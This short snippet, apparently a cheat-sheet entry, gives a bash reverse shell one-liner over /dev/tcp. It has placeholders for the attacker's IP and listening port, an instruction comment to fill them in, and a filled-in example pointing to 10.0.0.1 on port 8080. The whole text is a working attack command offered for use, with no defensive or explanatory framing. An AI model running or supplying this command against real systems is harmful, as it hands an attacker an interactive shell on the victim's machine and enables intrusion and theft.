# Replace {IP} with your IP and set port to your listening port

bash -i >& /dev/tcp/{IP}/{port} 0>&1

example: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
